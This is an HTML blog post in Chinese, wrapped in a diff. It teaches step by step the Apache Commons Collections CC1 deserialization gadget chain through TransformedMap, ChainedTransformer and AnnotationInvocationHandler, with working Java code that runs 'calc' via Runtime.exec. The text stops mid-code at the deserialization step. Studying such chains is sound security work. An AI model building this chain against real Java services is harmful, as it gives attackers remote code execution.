@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang='en' dir='auto'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='CC1-TransformedMap CC1链对JDK版本有要求，需在8u71之前
+Jdk1.8.0.65: https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html
+sun包: https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 src\share\classes\sun，放到Jdk下解压的src包内，Idea添加
+导入maven依赖（pom.xml）
+Transformer-执行类 主要利用方法 Transform()，看那些类实现了这个类
+查找用法，找到调用 transformer 的方法
+寻找调用链 InvokerTransformer InvokerTransformer构造函数控制参数，tranform() 可以执行任意命令
+// InvokerTransformer package Gadget.CC1; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.reflect.Method; public class CC1_1 { public static void main(String[] args) throws Exception { // Runtime正常执行 // Runtime.getRuntime().exec(&#34;calc&#34;); // Runtime反射执行 // Runtime r = Runtime.getRuntime(); // Class c = Runtime.class; // Method m = c.getMethod(&#34;exec&#34;,String.class); // m.invoke(r,&#34;calc&#34;); // InvokerTransformer.transform()实现 new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;calc&#34;}).transform(Runtime.getRuntime()); } } TransformedMap 进入到 InvokerTransformer类里，查看 Transform 的用法，找 TransformedMap'>
+<meta name='theme-color' content='#00ffff'>
+
+<meta property='og:title' content='CC1-TransformedMap • '>
+<meta property='og:description' content='CC1-TransformedMap CC1链对JDK版本有要求，需在8u71之前
+Jdk1.8.0.65: https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html
+sun包: https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 src\share\classes\sun，放到Jdk下解压的src包内，Idea添加
+导入maven依赖（pom.xml）
+Transformer-执行类 主要利用方法 Transform()，看那些类实现了这个类
+查找用法，找到调用 transformer 的方法
+寻找调用链 InvokerTransformer InvokerTransformer构造函数控制参数，tranform() 可以执行任意命令
+// InvokerTransformer package Gadget.CC1; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.reflect.Method; public class CC1_1 { public static void main(String[] args) throws Exception { // Runtime正常执行 // Runtime.getRuntime().exec(&#34;calc&#34;); // Runtime反射执行 // Runtime r = Runtime.getRuntime(); // Class c = Runtime.class; // Method m = c.getMethod(&#34;exec&#34;,String.class); // m.invoke(r,&#34;calc&#34;); // InvokerTransformer.transform()实现 new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;calc&#34;}).transform(Runtime.getRuntime()); } } TransformedMap 进入到 InvokerTransformer类里，查看 Transform 的用法，找 TransformedMap'>
+<meta property='og:url' content='https://n2ryx.github.io/docs/java/cc1-transformedmap/'>
+<meta property='og:site_name' content='n2ryx&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='docs'><meta property='article:tag' content='Java'><meta property='article:published_time' content='2023-11-12T00:00:00Z'/><meta property='article:modified_time' content='2023-11-12T00:00:00Z'/><meta name='twitter:card' content='summary'>
+
+<meta name="generator" content="Hugo 0.126.1">
+
+  <title>CC1-TransformedMap • </title>
+  <link rel='canonical' href='https://n2ryx.github.io/docs/java/cc1-transformedmap/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#00ffff;}
+</style>
+
+  
+
+
+  
+
+</head>
+<body class='page type-docs has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/images/logo.png'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      n2ryx&#39;s Blog
+      </a>
+    </h2>
+    <div class='desc'>
+    
+    </div>
+  </header>
+
+</section>
+<section class='widget widget-search sep-after'>
+  <header>
+    <h4 class='title widget-title'>Search</h4>
+  </header>
+
+  <form action='/search' id='search-form' class='search-form'>
+    <label>
+      <span class='screen-reader-text'>Search</span>
+      <input id='search-term' class='search-term' type='search' name='q' placeholder='Search&hellip;'>
+    </label></form>
+
+</section>
+<section class='widget widget-sidebar_menu sep-after'><nav id='sidebar-menu' class='menu sidebar-menu' aria-label='Sidebar Menu'>
+    <div class='container'>
+      <ul><li class='item'>
+  <a href='/'>主页</a></li><li class='item has-current'>
+  <a href='/docs/'>文档</a></li><li class='item'>
+  <a href='/archive/'>归档</a></li><li class='item'>
+  <a href='/about/'>关于</a></li></ul>
+    </div>
+  </nav>
+
+</section><section class='widget widget-taxonomy_cloud sep-after'>
+  <header>
+    <h4 class='title widget-title'>Tags</h4>
+  </header>
+
+  <div class='container list-container'>
+  <ul class='list taxonomy-cloud'><li>
+        <a href='/tags/java/' style='font-size:2em'>Java</a>
+      </li><li>
+        <a href='/tags/pentest/' style='font-size:1.0909090909090908em'>Pentest</a>
+      </li><li>
+        <a href='/tags/pollution/' style='font-size:1.1818181818181819em'>Pollution</a>
+      </li><li>
+        <a href='/tags/ssrf/' style='font-size:1em'>SSRF</a>
+      </li><li>
+        <a href='/tags/vul/' style='font-size:1.1818181818181819em'>Vul</a>
+      </li><li>
+        <a href='/tags/writeup/' style='font-size:1.0909090909090908em'>Writeup</a>
+      </li></ul>
+</div>
+
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="3" y1="12" x2="21" y2="12" />
+<line x1="3" y1="6" x2="21" y2="6" />
+<line x1="3" y1="18" x2="21" y2="18" />
+</svg>
+</span>
+  <span class='close'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="18" y1="6" x2="6" y2="18" />
+<line x1="6" y1="6" x2="18" y2="18" />
+</svg>
+</span>
+</button><div class='header-widgets'>
+        <div class='container'>
+    
+    <style>.widget-breadcrumbs li:after{content:'\2f '}</style>
+  <section class='widget widget-breadcrumbs sep-after'>
+    <nav id='breadcrumbs'>
+      <ol><li><a href='/'>主页</a></li><li><a href='/docs/'>文档</a></li><li><span>CC1-TransformedMap</span></li></ol>
+    </nav>
+  </section></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>n2ryx&#39;s Blog</p><p class='desc site-desc'></p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>CC1-TransformedMap</h1>
+      
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+<line x1="16" y1="2" x2="16" y2="6" />
+<line x1="8" y1="2" x2="8" y2="6" />
+<line x1="3" y1="10" x2="21" y2="10" />
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='2023-11-12T00:00:00Z'>2023, Nov 12</time>
+</span>
+
+  <span class='byline'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M21,21V20c0-2.76-4-5-9-5s-9,2.24-9,5v1" />
+<path d="M16,6.37A4,4,0,1,1,12.63,3,4,4,0,0,1,16,6.37Z" />
+</svg>
+<span class='screen-reader-text'> by </span><a href='/authors/%3cnil%3e'></a></span>
+  
+
+</div>
+
+
+  </div>
+</header>
+
+  
+  
+
+  <div class='container entry-content'>
+  <h2 id="cc1-transformedmap">CC1-TransformedMap</h2>
+<p>CC1链对JDK版本有要求，需在8u71之前</p>
+<p>Jdk1.8.0.65: <a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
+<p>sun包: <a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a>
+src\share\classes\sun，放到Jdk下解压的src包内，Idea添加</p>
+<p><img alt="image-20231114132357257" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114132357257.png"></p>
+<p>导入maven依赖（pom.xml）</p>
+<p><img alt="image-20231113194232916" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113194232916.png"></p>
+<h3 id="transformer-执行类">Transformer-执行类</h3>
+<p>主要利用方法 <code>Transform()</code>，看那些类实现了这个类</p>
+<p><img alt="image-20231113213642842" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113213642842.png"></p>
+<p>查找用法，找到调用 transformer 的方法</p>
+<h3 id="寻找调用链">寻找调用链</h3>
+<h4 id="invokertransformer">InvokerTransformer</h4>
+<p><img alt="image-20231113234523714" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113234523714.png"></p>
+<p>InvokerTransformer构造函数控制参数，<code>tranform()</code> 可以执行任意命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// InvokerTransformer</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> Gadget.CC1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Method;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC1_1</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Runtime正常执行</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        Runtime.getRuntime().exec(&#34;calc&#34;);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Runtime反射执行</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        Runtime r = Runtime.getRuntime();</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        Class c = Runtime.class;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        Method m = c.getMethod(&#34;exec&#34;,String.class);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        m.invoke(r,&#34;calc&#34;);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// InvokerTransformer.transform()实现</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>}).<span style="color:#a6e22e">transform</span>(Runtime.<span style="color:#a6e22e">getRuntime</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="transformedmap">TransformedMap</h4>
+<p>进入到 InvokerTransformer类里，查看 Transform 的用法，找 TransformedMap</p>
+<p><img alt="image-20231114111733071" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114111733071.png"></p>
+<p>这里的 valueTransformer 调用了 <code>transformer()</code>，TransformedMap构造方法可以给他赋值</p>
+<p><img alt="image-20231113222410600" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113222410600.png"></p>
+<p><code>TransformedMap()</code> 是一个保护方法，<code>decorate()</code> 方法调用了它，就可以赋值了</p>
+<p><img alt="image-20231114113445459" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114113445459.png"></p>
+<p>现在找哪里调用了 <code>checkSetValue()</code>，这里找到了 <code>setValue()</code></p>
+<p><img alt="image-20231114115339182" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114115339182.png"></p>
+<p>这个类还是 TransformedMap 的父类</p>
+<p><img alt="image-20231114115940344" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114115940344.png"></p>
+<p><code>setValue()</code> 在 AbstractInputCheckedMapDecorator 静态嵌套类 MapEntry</p>
+<p><img alt="image-20231114120226678" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114120226678.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> Gadget.CC1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.TransformedMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.annotation.Annotation;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC1_2</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        InvokerTransformer invokerTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>});
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        invokerTransformer.transform(Runtime.getRuntime());</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;key&#34;</span>,<span style="color:#e6db74">&#34;vlue&#34;</span>);  <span style="color:#75715e">// 添加键值对</span>
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> transformedMap <span style="color:#f92672">=</span> TransformedMap.<span style="color:#a6e22e">decorate</span>(map,<span style="color:#66d9ef">null</span>,invokerTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 对 Entry 进行遍历</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (Map.<span style="color:#a6e22e">Entry</span> entry:transformedMap.<span style="color:#a6e22e">entrySet</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// TransformedMap没有setValue()，会调用父类的setValue()</span>
+</span></span><span style="display:flex;"><span>            entry.<span style="color:#a6e22e">setValue</span>(Runtime.<span style="color:#a6e22e">getRuntime</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="寻找入口类">寻找入口类</h3>
+<p>AnnotationInvocationHandler类下的<code>readObject()</code></p>
+<p><img alt="image-20231114131907479" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114131907479.png"></p>
+<h4 id="readobject">readObject()</h4>
+<p><img alt="image-20231114133137755" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114133137755.png"></p>
+<p>后面的 for 正好在遍历 Map，要满足 if 的判断到达 <code>setValue()</code>，</p>
+<p>执行 <code>readObject()</code> 需要获取 AnnotationInvocationHandler 对象，default类型</p>
+<p><img alt="image-20231114133608973" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114133608973.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// AnnotationInvocationHandler类是default，不能直接获取</span>
+</span></span><span style="display:flex;"><span>Class c <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style="display:flex;"><span>Constructor  annotationInvocationHandlerConstructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getConstructor</span>(Class.<span style="color:#a6e22e">class</span>,Map.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>annotationInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>Object o <span style="color:#f92672">=</span> annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Target.<span style="color:#a6e22e">class</span>,transformedMap);
+</span></span></code></pre></div><p>回到前面，Runtime 没有实现 Serializable，所以不能序列化</p>
+<p><img alt="image-20231114134429551" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114134429551.png"></p>
+<p>Class 可以序列化，反射获取</p>
+<p><img alt="image-20231114134701335" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114134701335.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//不能序列化</span>
+</span></span><span style="display:flex;"><span>Runtime r <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//反射调用</span>
+</span></span><span style="display:flex;"><span>Class  c <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">class</span>;
+</span></span><span style="display:flex;"><span>Method getRuntimeMethod <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;getRuntime&#34;</span>,<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>Runtime r <span style="color:#f92672">=</span> (Runtime) getRuntimeMethod.<span style="color:#a6e22e">invoke</span>(<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>Method execMethod <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;exec&#34;</span>,String.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>execMethod.<span style="color:#a6e22e">invoke</span>(r,<span style="color:#e6db74">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 修改成 InvokerTransformer 调用形式</span>
+</span></span><span style="display:flex;"><span>Method getRuntimeMethod <span style="color:#f92672">=</span> (Method) <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">null</span>}).<span style="color:#a6e22e">transform</span>(Runtime.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Runtime r <span style="color:#f92672">=</span> (Runtime) <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>}).<span style="color:#a6e22e">transform</span>(getRuntimeMethod);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 执行测试</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>}).<span style="color:#a6e22e">transform</span>(r);
+</span></span></code></pre></div><h4 id="chainedtransformer">ChainedTransformer</h4>
+<p><img alt="image-20231113234038569" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113234038569.png"></p>
+<p>该类维护了一个Transformer接口类型的数组iTransformers，<code>transform()</code> 先将输入的对象交给iTransformers数组第一个转换器的 <code>transform()</code> 进行修饰，修饰后的结果又作为下一个转化器的要修饰的对象（链式转化器）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> Gadget.CC1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.TransformedMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.annotation.Target;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Constructor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Method;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC1_Serial</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ChainedTransformer链式执行</span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        chainedTransformer.transform(Runtime.class);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;value&#34;</span>,<span style="color:#e6db74">&#34;aaa&#34;</span>);  <span style="color:#75715e">// 添加键值对</span>
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> transformedMap <span style="color:#f92672">=</span> TransformedMap.<span style="color:#a6e22e">decorate</span>(map,<span style="color:#66d9ef">null</span>,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// AnnotationInvocationHandler类是default，不能直接获取</span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style="display:flex;"><span>        Constructor  annotationInvocationHandlerConstructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredConstructor</span>(Class.<span style="color:#a6e22e">class</span>,Map.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        annotationInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>,transformedMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
